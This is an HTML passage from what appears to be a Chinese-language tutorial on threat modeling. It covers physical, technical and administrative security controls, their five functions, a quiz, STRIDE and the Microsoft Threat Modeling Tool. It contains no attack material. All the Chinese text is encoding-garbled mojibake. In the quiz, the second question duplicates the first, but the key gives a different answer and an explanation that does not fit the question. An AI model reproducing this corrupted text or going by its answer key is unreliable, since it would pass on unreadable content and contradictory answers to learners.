data-srcset="/img/thread-modeling/physical.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="physical"></td><td align="left">ç‰©ç†</td><td align="left">æ­¤ç±»æ§åˆ¶æªæ–½ä»ç‰©ç†ä¸Šé˜»æ­¢æˆ–æ£€æµ‹æœªç»æˆæƒçš„è®¿é—®ã€‚ ç¤ºä¾‹åŒ…æ‹¬å…¥å£ã€å¾½ç« ã€æ‘„åƒå¤´ã€ç…§æ˜å’ŒæŠ‘åˆ¶ç³»ç»Ÿã€‚</td></tr><tr><td align="left"><img src="/img/thread-modeling/technical.png" class="lazyload" data-srcset="/img/thread-modeling/technical.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="technical"></td><td align="left">æŠ€æœ¯</td><td align="left">æ­¤ç±»æ§åˆ¶æªæ–½ä»é€»è¾‘ä¸Šä¿æŠ¤ç³»ç»Ÿã€‚ ç¤ºä¾‹åŒ…æ‹¬é˜²ç«å¢™ã€é˜²ç—…æ¯’è½¯ä»¶ã€è®¿é—®æ§åˆ¶åˆ—è¡¨å’ŒåŠ å¯†ã€‚</td></tr><tr><td align="left"><img src="/img/thread-modeling/administrative.png" class="lazyload" data-srcset="/img/thread-modeling/administrative.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="administrative"></td><td align="left">ç®¡ç†</td><td align="left">æ­¤ç±»æ§åˆ¶æªæ–½æŒ‡ä¸ºç³»ç»Ÿå®šä¹‰æµç¨‹çš„ç­–ç•¥ã€‚ ç¤ºä¾‹åŒ…æ‹¬æ•°æ®åˆ†ç±»ã€å®¡æ ¸å’Œé™åˆ¶ã€‚</td></tr></tbody></table><div class="note info"><p>æ ¹æ®ç³»ç»Ÿï¼Œä½ éœ€è¦åº”ç”¨å„ç§ç±»å‹çš„å®‰å…¨æ§åˆ¶æªæ–½ï¼Œå¸®åŠ©å»ºç«‹å¤šå±‚ä¿æŠ¤ä»¥æå‡ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚</p></div><h4 id="å®‰å…¨æ§åˆ¶åŠŸèƒ½"><a href="#å®‰å…¨æ§åˆ¶åŠŸèƒ½" class="headerlink" title="å®‰å…¨æ§åˆ¶åŠŸèƒ½"></a>å®‰å…¨æ§åˆ¶åŠŸèƒ½</h4><p>é™¤äº†è¿™ä¸‰ç§ä¸»è¦ç±»å‹å¤–ï¼Œå®‰å…¨æ§åˆ¶è¿˜å…·æœ‰äº”ä¸ªä¸åŒçš„åŠŸèƒ½ï¼Œå¯å¸®åŠ©ä½ åº”ç”¨å¤šä¸ªå®‰å…¨å±‚ã€‚</p><table><thead><tr><th align="left">å‡½æ•°</th><th align="left">è¯´æ˜</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">é¢„é˜²</td><td align="left">æ­¤ç­–ç•¥æ˜¯å¦æœ‰åŠ©äºé™ä½æ­¤å¨èƒçš„æ¦‚ç‡æˆ–å½±å“ï¼Ÿ</td><td align="left">é”å®šã€é˜²ç«å¢™ã€æ•°æ®åˆ†ç±»ã€‚</td></tr><tr><td align="left">æ£€æµ‹</td><td align="left">æ­¤ç­–ç•¥æ˜¯å¦æœ‰åŠ©äºè¯†åˆ«æ‰€å‘ç”Ÿçš„ç³»ç»Ÿæ”»å‡»ï¼Ÿ</td><td align="left">ç›‘è§†ã€è¯±æ•ç³»ç»Ÿã€å®¡æ ¸æ—¥å¿—ã€‚</td></tr><tr><td align="left">çº æ­£</td><td align="left">æ­¤ç­–ç•¥æ˜¯å¦æœ‰åŠ©äºæ§åˆ¶å¦‚ä½•å“åº”ä¼ å…¥æ”»å‡»ï¼Ÿ</td><td align="left">ç‰©ç†ä¿®å¤ã€ç³»ç»Ÿä¿®è¡¥ç¨‹åºã€äº‹ä»¶å“åº”è®¡åˆ’ã€‚</td></tr><tr><td align="left">æ¢å¤</td><td align="left">æ­¤é£é™©ç¼“è§£æªæ–½æ˜¯å¦æœ‰åŠ©äºæœåŠ¡ä»æ”»å‡»ä¸­æ¢å¤ï¼Ÿ</td><td align="left">çƒ­ç«™ç‚¹ã€ç³»ç»Ÿå¤‡ä»½ã€ç¾éš¾æ¢å¤è®¡åˆ’ã€‚</td></tr><tr><td align="left">é˜»ç¢</td><td align="left">æ­¤é£é™©ç¼“è§£æªæ–½æ˜¯å¦æœ‰åŠ©äºé˜»æ­¢æ”»å‡»è€…è®¿é—®ç³»ç»Ÿï¼Ÿ</td><td align="left">æ—¶é™ã€æœ€ä½æƒé™ã€æˆæƒä½¿ç”¨ç­–ç•¥ã€‚</td></tr></tbody></table><div class="note green"><p>æ ¹æ®é—®é¢˜çš„ä¼˜å…ˆçº§ï¼Œå¯ä»¥è€ƒè™‘åœ¨ç³»ç»Ÿè¢«ç ´åä¹‹å‰ã€ç ´åè¿‡ç¨‹ä¸­å’Œç ´åä¹‹åä½¿ç”¨å¤šé¡¹å®‰å…¨æ§åˆ¶åŠŸèƒ½æ¥ä¿æŠ¤å®ƒã€‚</p></div><h4 id="å¦‚ä½•ç»¼åˆåˆ©ç”¨æ‰€æœ‰ä¿¡æ¯"><a href="#å¦‚ä½•ç»¼åˆåˆ©ç”¨æ‰€æœ‰ä¿¡æ¯" class="headerlink" title="å¦‚ä½•ç»¼åˆåˆ©ç”¨æ‰€æœ‰ä¿¡æ¯"></a>å¦‚ä½•ç»¼åˆåˆ©ç”¨æ‰€æœ‰ä¿¡æ¯</h4><p>å®ƒä»¬ä¸å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å…±åŒå½¢æˆä¸€ä¸ªçŸ©é˜µï¼Œå¯å¸®åŠ©ä½ åšå‡ºæ­£ç¡®çš„é€‰æ‹©ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹ï¼š</p><table><thead><tr><th align="left">åŠŸèƒ½</th><th align="left">ç‰©ç†</th><th align="left">é€»è¾‘</th><th align="left">ç®¡ç†</th></tr></thead><tbody><tr><td align="left">é¢„é˜²</td><td align="left">é”å®š</td><td align="left">é˜²ç«å¢™</td><td align="left">æ•°æ®åˆ†ç±»</td></tr><tr><td align="left">æ£€æµ‹</td><td align="left">ç›‘è§†</td><td align="left">è¯±æ•ç³»ç»Ÿ</td><td align="left">å®¡æ ¸æ—¥å¿—</td></tr><tr><td align="left">çº æ­£</td><td align="left">ç‰©ç†ä¿®å¤</td><td align="left">ç³»ç»Ÿä¿®è¡¥ç¨‹åº</td><td align="left">äº‹ä»¶å“åº”è®¡åˆ’</td></tr><tr><td align="left">æ¢å¤</td><td align="left">çƒ­ç«™ç‚¹</td><td align="left">ç³»ç»Ÿå¤‡ä»½</td><td align="left">ç¾éš¾æ¢å¤è®¡åˆ’</td></tr><tr><td align="left">é˜»ç¢</td><td align="left">æ—¶é™</td><td align="left">æœ€ä½æƒé™</td><td align="left">æˆæƒä½¿ç”¨ç­–ç•¥</td></tr></tbody></table><h4 id="çŸ¥è¯†æ£€æŸ¥-20"><a href="#çŸ¥è¯†æ£€æŸ¥-20" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>ç®¡ç†å®‰å…¨æ§åˆ¶æªæ–½æœ‰ä»€ä¹ˆç¤ºä¾‹ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. åˆ›å»ºäº‹ä»¶å“åº”è®¡åˆ’ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. å®‰è£…æ–°é˜²ç«å¢™ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. åœ¨å…¥å£æ·»åŠ å¾½ç« æ‰«æä»ªã€‚</p>            </div><ol start="2"><li>ç®¡ç†å®‰å…¨æ§åˆ¶æªæ–½æœ‰ä»€ä¹ˆç¤ºä¾‹ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. åˆ›å»ºäº‹ä»¶å“åº”è®¡åˆ’ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. å®‰è£…æ–°é˜²ç«å¢™ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. åœ¨å…¥å£æ·»åŠ å¾½ç« æ‰«æä»ªã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š</p><ol><li><psw>== A ==</psw></li><li><psw>== C ==</psw></li></ol><p>è§£é‡Šï¼š</p><ol><li><psw>A. æ­¤æ¡ç›®é€‚ç”¨äºç®¡ç†å‹å®‰å…¨æ§åˆ¶æªæ–½ã€‚B. æ­¤æ¡ç›®é€‚ç”¨äºé€»è¾‘å‹ï¼ˆå¯èƒ½è¿˜æœ‰ç‰©ç†å‹ï¼‰å®‰å…¨æ§åˆ¶æªæ–½ã€‚C. æ­¤æ¡ç›®é€‚ç”¨äºç‰©ç†å‹å®‰å…¨æ§åˆ¶æªæ–½ã€‚</psw></li><li><psw>A. æ­¤æ¡ç›®é€‚ç”¨äºé¢„é˜²æ€§å®‰å…¨æ§åˆ¶åŠŸèƒ½ã€‚B. æ­¤æ¡ç›®é€‚ç”¨äºæ£€æµ‹æ€§å®‰å…¨æ§åˆ¶åŠŸèƒ½ã€‚C. æ­¤æ¡ç›®é€‚ç”¨äºçŸ«æ­£æ€§å®‰å…¨æ§åˆ¶åŠŸèƒ½ã€‚</psw></li></ol><h3 id="å°ç»“-5"><a href="#å°ç»“-5" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>å¨èƒå»ºæ¨¡æ¡†æ¶ä¼šä¸ºä½ æä¾›å¨èƒåˆ—è¡¨ï¼Œå¹¶æä¾›é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚ ä½†æ˜¯ï¼Œå®ƒä¸ä¼šä¸ºä½ ç¡®å®šå¨èƒçš„ä¼˜å…ˆçº§ã€‚ æ­¤å¤–ï¼Œæ²¡æœ‰åŸºäºå…¶ç±»å‹å’ŒåŠŸèƒ½çš„åˆ†å±‚å®‰å…¨æ§åˆ¶å»ºè®®ã€‚</p><p>ä½ äº†è§£äº†å¦‚ä½•ç¡®å®šé—®é¢˜çš„ä¼˜å…ˆçº§ï¼Œä»¥åŠå¦‚ä½•æ ¹æ®ç±»å‹å’ŒåŠŸèƒ½åº”ç”¨æ°å½“çš„å®‰å…¨æ§åˆ¶å±‚ã€‚</p><p>åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å·²ç»å­¦ä¹ äº†ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>äº†è§£äº†å¦‚ä½•ç¡®å®šé—®é¢˜çš„ä¼˜å…ˆçº§</li><li>åˆ†ç±»å®‰å…¨æ§åˆ¶</li><li>äº†è§£æ¯ä¸ªå‹å®‰å…¨æ§åˆ¶æªæ–½å’ŒåŠŸèƒ½</li></ul><h2 id="æ¨¡å—7-ä½¿ç”¨æ¨èå·¥å…·åˆ›å»ºæ•°æ®æµå›¾"><a href="#æ¨¡å—7-ä½¿ç”¨æ¨èå·¥å…·åˆ›å»ºæ•°æ®æµå›¾" class="headerlink" title="æ¨¡å—7 | ä½¿ç”¨æ¨èå·¥å…·åˆ›å»ºæ•°æ®æµå›¾"></a>æ¨¡å—7 | ä½¿ç”¨æ¨èå·¥å…·åˆ›å»ºæ•°æ®æµå›¾</h2><h3 id="ç®€ä»‹-2"><a href="#ç®€ä»‹-2" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>æ•°æ®æµå…³ç³»å›¾æ˜¯ç³»ç»Ÿå·¥ä½œæ–¹å¼çš„å›¾å½¢åŒ–è¡¨ç¤ºå½¢å¼ã€‚ è¿™åŒ…æ‹¬æ‰€æœ‰æ•°æ®å­˜å‚¨ã€è¿›ç¨‹ã€å¤–éƒ¨å®ä½“ã€ä¿¡ä»»è¾¹ç•Œå’Œæ•°æ®æµã€‚</p><h4 id="å¦‚ä½•åˆ›å»ºæ•°æ®æµå…³ç³»å›¾"><a href="#å¦‚ä½•åˆ›å»ºæ•°æ®æµå…³ç³»å›¾" class="headerlink" title="å¦‚ä½•åˆ›å»ºæ•°æ®æµå…³ç³»å›¾"></a>å¦‚ä½•åˆ›å»ºæ•°æ®æµå…³ç³»å›¾</h4><p>ä½ å¯ä»¥ä½¿ç”¨ä»»ä½•ç”»å¸ƒï¼ˆç‰©ç†çš„æˆ–è™šæ‹Ÿçš„ï¼‰æ¥åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ã€‚ ä½†æ˜¯ï¼Œç¡®å®éœ€è¦äº†è§£å¨èƒå»ºæ¨¡çš„åŸç†ï¼Œæ‰èƒ½æ­£ç¡®åœ°å¯¹å…¶è¿›è¡Œåˆ†æã€‚</p><p>æŸäº›åº”ç”¨ç¨‹åºæä¾›çš„å¤šç§å·¥å…·ï¼Œå®ƒä»¬å¯ä»¥é€šè¿‡å¨èƒç”Ÿæˆå¼•æ“å’Œé£é™©é™ä½ç­–ç•¥ï¼Œå¸®åŠ©ä½ åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ã€‚ å…¶ä»–å·¥å…·ä»…æä¾›åˆ›å»ºæ•°æ®æµå…³ç³»å›¾çš„åŠŸèƒ½ã€‚</p><h4 id="ç›®æ ‡-4"><a href="#ç›®æ ‡-4" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h4><p>è¯¥å­¦ä¹ è·¯å¾„çš„ç›®æ ‡æ˜¯è®©ä½ äº†è§£å¨èƒå»ºæ¨¡çš„åŸºç¡€çŸ¥è¯†ï¼Œä»¥ä¾¿åœ¨ä»»ä½•åœ°æ–¹ã€ä»»ä½•ç”»å¸ƒä¸Šè¿›è¡Œå¨èƒå»ºæ¨¡ã€‚</p><p>ä¸ºäº†å¸®åŠ©ä½ å®ç°è¿™ä¸ªç›®æ ‡ï¼Œæˆ‘ä»¬ä¼šåœ¨ä»‹ç»è¿‡ç¨‹ä¸­æ¨èä¸€äº›å·¥å…·ã€‚</p><h4 id="å­¦ä¹ ç›®æ ‡-6"><a href="#å­¦ä¹ ç›®æ ‡-6" class="headerlink" title="å­¦ä¹ ç›®æ ‡"></a>å­¦ä¹ ç›®æ ‡</h4><p>åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†å­¦ä¹ ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>è¯¦ç»†äº†è§£äº† Threat Modeling Tool</li><li>è¯¦ç»†äº†è§£ Visio</li></ul><div class="note success"><p>æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ</p></div><h3 id="å»ºè®®çš„å·¥å…·"><a href="#å»ºè®®çš„å·¥å…·" class="headerlink" title="å»ºè®®çš„å·¥å…·"></a>å»ºè®®çš„å·¥å…·</h3><p>å¨èƒå»ºæ¨¡å°†å¯¹ä½ çš„æ•°æ®æµå…³ç³»å›¾åº”ç”¨ä¸€ä¸ªæ¡†æ¶ï¼Œä»¥å¸®åŠ©æ‰¾åˆ°é™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¨èƒå’Œæ–¹æ³•ã€‚</p><p>æŸäº›å·¥å…·å¯å¸®åŠ©ä½ åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ï¼Œå¦ä¸€äº›è¿˜å¯ä»¥å¸®åŠ©ä½ è¿›è¡Œå¨èƒç”Ÿæˆç»ƒä¹ ã€‚ æ ¹æ®ä½ åœ¨å¨èƒå»ºæ¨¡æ–¹é¢çš„ä¸“ä¸šæ°´å¹³ï¼Œå…¶ä¸­ä¸€äº›å·¥å…·å¯èƒ½ä¼šå¾ˆæœ‰å¸®åŠ©ã€‚</p><h4 id="è¯¦ç»†äº†è§£-Threat-Modeling-Tool"><a href="#è¯¦ç»†äº†è§£-Threat-Modeling-Tool" class="headerlink" title="è¯¦ç»†äº†è§£ Threat Modeling Tool"></a>è¯¦ç»†äº†è§£ Threat Modeling Tool</h4><p>åœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªå•å…ƒä¸­ï¼Œä½ å°†äº†è§£æœ‰å…³ä¸€äº›å·¥å…·çš„è¯¦ç»†ä¿¡æ¯ï¼š</p><ul><li>Threat Modeling Tool æä¾›å¤šç§å·¥å…·ï¼Œå¯ç”¨äºåˆ›å»ºæ•°æ®æµå…³ç³»å›¾å¹¶å¯¹å…¶è¿›è¡Œåˆ†æï¼Œä»¥æŸ¥æ‰¾æ½œåœ¨å¨èƒå’Œé£é™©é™ä½ç­–ç•¥<ul><li>åœ¨çº¿å®‰è£…ç‰ˆï¼Œ<a href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling">https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling</a></li><li>ç¦»çº¿å®‰è£…ç‰ˆï¼Œ<a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">https://www.microsoft.com/en-us/download/details.aspx?id=49168</a> ï¼ˆ2016ï¼‰</li><li>æƒ³è£…å…¶ä»–ç¦»çº¿ç‰ˆæœ¬çš„ï¼ŒGuguru ä¸€ä¸‹ <u>microsoft threat modeling tool offline installer</u> å°±å¥½äº†</li></ul></li><li>Visio æä¾›äº†ä¸€ä¸ªå¹²å‡€çš„ç”»å¸ƒï¼Œå¸®åŠ©ä½ åˆ›å»ºæ•°æ®æµå…³ç³»å›¾<ul><li>Visioï¼Œï¼ˆè¦é’±çš„ æ‰“æ‰°äº†</li></ul></li></ul><p>æˆ‘ä»¬å°†åœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªå•å…ƒä¸­è¿›è¡Œä»‹ç»ã€‚</p><h3 id="Threat-Modeling-Tool"><a href="#Threat-Modeling-Tool" class="headerlink" title="Threat Modeling Tool"></a>Threat Modeling Tool</h3><p>Microsoft Threat Modeling Tool ç”± Microsoft å‘å¸ƒï¼Œå¹¶è·å¾—å¨èƒå»ºæ¨¡ç¤¾åŒºè¿›è¡Œè®¤å¯ï¼Œå¯ä»¥å¸®åŠ©å·¥ç¨‹å¸ˆåˆ›å»ºæ•°æ®æµå…³ç³»å›¾å¹¶å°† STRIDE åº”ç”¨äºå…¶å¨èƒå»ºæ¨¡å·¥ä½œã€‚</p><p>Threat Modeling Tool æä¾›ï¼š</p><ul><li>å¯è‡ªå®šä¹‰çš„æ¨¡æ¿</li><li>å¨èƒç”Ÿæˆå¼•æ“ï¼Œå…¶ä¸­åŒ…å«å¨èƒå’Œé£é™©é™ä½ç­–ç•¥</li></ul><p>é»˜è®¤æ¨¡æ¿ç§°ä¸ºâ€œSDL TM çŸ¥è¯†åº“â€ï¼Œæä¾›ä¸€ç»„åŸºæœ¬å…ƒç´ å’Œå¨èƒç”ŸæˆåŠŸèƒ½ã€‚ åªè¦å¯¹æ•°æ®æµå…³ç³»å›¾å’Œ STRIDE æœ‰åŸºæœ¬çš„äº†è§£å³å¯ä½¿ç”¨ã€‚</p><h4 id="STRIDE-å›é¡¾"><a href="#STRIDE-å›é¡¾" class="headerlink" title="STRIDE å›é¡¾"></a>STRIDE å›é¡¾</h4><p>STRIDE æ˜¯å…­ä¸ªä¸»è¦å¨èƒç±»åˆ«çš„é¦–å­—æ¯ç¼©å†™ï¼š</p><ul><li>æ¬ºéª— - å†’å……æŸäººæˆ–æŸç‰©</li><li>ç¯¡æ”¹ - æœªç»æˆæƒæ›´æ”¹æ•°æ®</li><li>å¦è®¤æ€§ - ä¸å®£ç§°å¯¹æ‰§è¡Œçš„æ“ä½œè´Ÿè´£</li><li>ä¿¡æ¯æ³„éœ² - åœ¨æœªè·å¾—æƒé™çš„æƒ…å†µä¸‹æŸ¥çœ‹æ•°æ®</li><li>æ‹’ç»æœåŠ¡ - ä½¿ç³»ç»Ÿè¿‡è½½</li><li>æƒé™æå‡ - æ‹¥æœ‰æœ¬ä¸åº”æ‹¥æœ‰çš„æƒé™</li></ul><h4 id="é«˜çº§ç”¨æˆ·éƒ¨åˆ†"><a href="#é«˜çº§ç”¨æˆ·éƒ¨åˆ†" class="headerlink" title="é«˜çº§ç”¨æˆ·éƒ¨åˆ†"></a>é«˜çº§ç”¨æˆ·éƒ¨åˆ†</h4><p>å¯¹äºæ›´é«˜çº§çš„ç”¨æˆ·ï¼Œå¯ä»¥åœ¨ä¸‰ä¸ªä¸»è¦éƒ¨åˆ†å¯¹æ¨¡æ¿è¿›è¡Œè‡ªå®šä¹‰ã€‚</p><h5 id="æ¨¡å…·"><a href="#æ¨¡å…·" class="headerlink" title="æ¨¡å…·"></a>æ¨¡å…·</h5><p>è¿›ç¨‹ã€å¤–éƒ¨å®ä½“ã€æ•°æ®å­˜å‚¨ã€æ•°æ®æµå’Œä¿¡ä»»è¾¹ç•Œæ„æˆäº†çˆ¶å…ƒç´ ã€‚</p><p><img src="/img/thread-modeling/parentstencils.jpeg" class="lazyload" data-srcset="/img/thread-modeling/parentstencils.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="parentstencils"></p><p>ä½ è¿˜å¯ä»¥åˆ›å»ºå­å…ƒç´ ï¼Œä»¥å¸®åŠ©ä¸ºå…¶ä»–ä¸Šä¸‹æ–‡ã€å¯æ“ä½œçš„å¨èƒç”Ÿæˆå’Œé£é™©é™ä½ç­–ç•¥æä¾›ç²’åº¦ã€‚</p><p><img src="/img/thread-modeling/expandedflowstencils.jpeg" class="lazyload" data-srcset="/img/thread-modeling/expandedflowstencils.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="expandedflowstencils"></p><h6 id="å­å…ƒç´ çš„å·¥ä½œåŸç†ç¤ºä¾‹"><a href="#å­å…ƒç´ çš„å·¥ä½œåŸç†ç¤ºä¾‹" class="headerlink" title="å­å…ƒç´ çš„å·¥ä½œåŸç†ç¤ºä¾‹"></a>å­å…ƒç´ çš„å·¥ä½œåŸç†ç¤ºä¾‹</h6><p>çˆ¶å…ƒç´ æä¾›äº†é€‰æ‹© HTTP å’Œ HTTPS å­å…ƒç´ çš„é€‰é¡¹ã€‚</p><p>HTTP åº”ç”Ÿæˆæ›´å¤šçš„å¨èƒï¼Œå› ä¸ºç¯¡æ”¹ã€ä¿¡æ¯æ³„éœ²å’Œæ¬ºéª—å¨èƒå¸¸è§äºæœªåŠ å¯†é€šé“ã€‚</p><p><strong>ä½¿ç”¨ HTTP</strong></p><p><img src="/img/thread-modeling/http.jpeg" class="lazyload" data-srcset="/img/thread-modeling/http.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="http"></p><p><strong>ä½¿ç”¨ HTTPS</strong></p><p><img src="/img/thread-modeling/https.jpeg" class="lazyload" data-srcset="/img/thread-modeling/https.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="https"></p><h6 id="å¦‚ä½•æ·»åŠ å…ƒç´ å±æ€§"><a href="#å¦‚ä½•æ·»åŠ å…ƒç´ å±æ€§" class="headerlink" title="å¦‚ä½•æ·»åŠ å…ƒç´ å±æ€§"></a>å¦‚ä½•æ·»åŠ å…ƒç´ å±æ€§</h6><p>å¦‚æœæœ‰å¿…é¡»åŒ…æ‹¬åœ¨é»˜è®¤æ¨¡æ¿ä¸­çš„å…¶ä»–å±æ€§ï¼Œå¯ä»¥åœ¨ç®¡ç†å‘˜è§†å›¾ä¸­å°†å…¶æ·»åŠ åˆ°æ¯ä¸ªå…ƒç´ ã€‚</p><p><img src="/img/thread-modeling/stencilpropertiesadmin.jpeg" class="lazyload" data-srcset="/img/thread-modeling/stencilpropertiesadmin.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="stencilpropertiesadmin"></p><p>å½“ç”¨æˆ·å°†è¯¥å…ƒç´ æ‹–æ”¾åˆ°ç”»å¸ƒä¸Šæ—¶ï¼Œå°†çœ‹åˆ°è‡ªå·±çš„æ›´æ”¹ã€‚</p><p><img src="/img/thread-modeling/stencilproperties.jpeg" class="lazyload" data-srcset="/img/thread-modeling/stencilproperties.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="stencilproperties"></p><h5 id="å¨èƒå±æ€§"><a href="#å¨èƒå±æ€§" class="headerlink" title="å¨èƒå±æ€§"></a>å¨èƒå±æ€§</h5><p>ä½¿ç”¨å±æ€§å¯ä»¥åˆ›å»ºä¸ºæ¯ä¸ªç”Ÿæˆçš„å¨èƒå¡«å……çš„å­—æ®µï¼Œå°±åƒä½¿ç”¨æ¨¡å…·å±æ€§å¯ä»¥ä¸ºæ¯ä¸ªå…ƒç´ åˆ›å»ºå­—æ®µä¸€æ ·ã€‚</p><p><u><strong>è¯·è®°ä½ï¼šç›®æ ‡æ˜¯ä»¥æœ€ç®€å•çš„æ–¹å¼è·å¾—å°½å¯èƒ½å¤šçš„ä¸Šä¸‹æ–‡ã€‚</strong></u></p><h6 id="å¨èƒå±æ€§çš„ç¤ºä¾‹"><a href="#å¨èƒå±æ€§çš„ç¤ºä¾‹" class="headerlink" title="å¨èƒå±æ€§çš„ç¤ºä¾‹"></a>å¨èƒå±æ€§çš„ç¤ºä¾‹</h6><p><strong>ç®¡ç†å‘˜è§†å›¾</strong></p><p>æ·»åŠ å¯ä¸ºä½ æä¾›æ›´å¤šä¸Šä¸‹æ–‡å’Œå¯æ“ä½œæ­¥éª¤çš„å­—æ®µã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>é—®é¢˜ä¼˜å…ˆçº§ - äº†è§£éœ€è¦é¦–å…ˆå¤„ç†å“ªäº›é—®é¢˜</li><li>è¶…é“¾æ¥ - å°†é—®é¢˜é“¾æ¥åˆ°è”æœºæ–‡æ¡£</li><li>å¤–éƒ¨é£é™©æ˜ å°„ - é€šè¿‡ä½¿ç”¨å¯é çš„ç¬¬ä¸‰æ–¹æºï¼ˆå¦‚ OWASP Top 10 å’Œ CWE è¯¦ç»†ä¿¡æ¯ï¼‰ï¼Œä½¿ç”¨ä¸å…¶ä»–ç»„ç»‡ç›¸åŒçš„è¯­è¨€æ¥æè¿°é£é™©</li></ul><p><img src="/img/thread-modeling/threatadminview.jpeg" class="lazyload" data-srcset="/img/thread-modeling/threatadminview.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="threatadminview"></p><p>å•Šè¿™ï¼Œè¶…é“¾æ¥å’Œå¤–éƒ¨é£é™©åœ¨å“ª ï¼ˆ</p><p><strong>ç”¨æˆ·è§†å›¾</strong></p><p>Threat Modeling Tool 